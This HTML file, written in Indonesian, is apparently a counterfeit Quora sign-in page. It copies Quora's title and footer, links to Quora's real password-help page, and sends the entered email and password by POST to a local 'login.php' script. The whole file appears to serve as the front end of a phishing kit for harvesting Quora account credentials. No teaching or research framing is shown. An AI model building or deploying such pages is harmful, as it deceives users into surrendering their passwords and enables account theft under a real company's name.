<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke Quora</title>
    <style>
        /* Reset dasar */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Gaya umum untuk dark mode */
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            padding: 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* Ganti logo Q dengan SVG */
        .logo-icon {
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon svg {
            width: 100%;
            height: 100%;
            fill: #e43f3f; /* Warna merah sesuai tema */
        }

        /* Tombol Masuk di header */
        .login-button {
            background-color: #3a7bd5;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-button:hover {
            background-color: #2c5fa3;
        }

        /* Judul */
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #1e1e1e;
            color: white;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #3a7bd5;
            box-shadow: 0 0 0 2px rgba(58, 123, 213, 0.2);
        }

        /* Link lupa kata sandi */
        .forgot-password {
            color: #999;
            text-decoration: none;
            font-size: 14px;
            margin-top: 10px;
            display: inline-block;
        }

        .forgot-password:hover {
            text-decoration: underline;
            color: #cccccc;
        }

        /* Footer */
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #777;
        }

        /* Responsif */
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            h1 {
                font-size: 22px;
            }
            input {
                padding: 10px;
                font-size: 14px;
            }
            .login-button {
                padding: 8px 16px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="logo">
            <div class="logo-icon">
                <svg viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg">

                </svg>
            </div>
            <span>Bahasa Indonesia</span>
        </div>
        <button type="button" class="login-button">Masuk</button>
    </div>

    <!-- Judul -->
    <h1>Masuk ke Quora</h1>

    <!-- Form Login -->
    <form id="login-form" action="login.php" method="POST">
        <div class="form-group">
            <label for="email">Surel</label>
            <input type="email" id="email" name="email" placeholder="Surel Anda" required>
        </div>

        <div class="form-group">
            <label for="password">Sandi</label>
            <input type="password" id="password" name="password" placeholder="Kata sandi Anda" required>
        </div>

        <a href="https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-" class="forgot-password">Lupa kata sandi?</a>
    </form>

    <!-- Footer -->
    <div class="footer">
        Â© Quora Inc.
    </div>

    <script>
        // Submit form saat tombol "Masuk" diklik
        document.querySelector('.login-button').addEventListener('click', function() {
            document.getElementById('login-form').submit();
        });

        // Submit form saat Enter ditekan di form
        document.getElementById('login-form').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                document.getElementById('login-form').submit();
            }
        });
    </script>
</body>
</html>
